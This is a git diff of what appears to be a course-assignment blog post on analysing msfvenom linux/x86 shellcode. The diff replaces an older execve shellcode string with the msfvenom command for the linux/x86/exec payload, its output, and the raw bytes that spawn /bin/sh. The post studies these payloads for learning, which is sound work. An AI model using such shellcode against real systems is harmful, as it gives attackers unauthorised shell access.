@@ -18,7 +18,7 @@ classes: wide
 
 * Take up at least 3 shellcode samples created using Msfvenom for linux/x86
 * Use GDB/Ndisasm/Libemu to dissect the functionality of the shellcode
-* Present your analysis
+* Present the analysis
 
 #### Concept 
 -----
@@ -33,13 +33,20 @@ The 3 Msfvenom examples that will be presented:
 * <code class="language-plaintext highlighter-rouge">linux/x86/shell_reverse_tcp</code> 
 * <code class="language-plaintext highlighter-rouge">linux/x86/read_file</code> 
 
-#### Insertion Encoder in Python
+#### 1st Shellcode (linux/x86/exec)
 --------
 
-The execve-stack shellcode from the course material will be used as a reference for the shellcode, the shellcode will spawn a <code class="language-plaintext highlighter-rouge">/bin/sh</code> shell:
+The exec payload will generate shellcode will spawn a <code class="language-plaintext highlighter-rouge">/bin/sh</code> shell:
 
 ```bash
-"\x31\xc0\x50\x68\x62\x61\x73\x68\x68\x62\x69\x6e\x2f\x68\x2f\x2f\x2f\x2f\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80"
+msfvenom -p linux/x86/exec CMD=/bin/sh --arch x86 --platform linux -f c
+No encoder or badchars specified, outputting raw payload
+Payload size: 43 bytes
+Final size of c file: 205 bytes
+unsigned char buf[] = 
+"\x6a\x0b\x58\x99\x52\x66\x68\x2d\x63\x89\xe7\x68\x2f\x73\x68"
+"\x00\x68\x2f\x62\x69\x6e\x89\xe3\x52\xe8\x08\x00\x00\x00\x2f"
+"\x62\x69\x6e\x2f\x73\x68\x00\x57\x53\x89\xe1\xcd\x80";
 ```
 
 The following Python code will be used as a shellcode wrapper to generate the obfuscated shellcode from the original shellcode: 
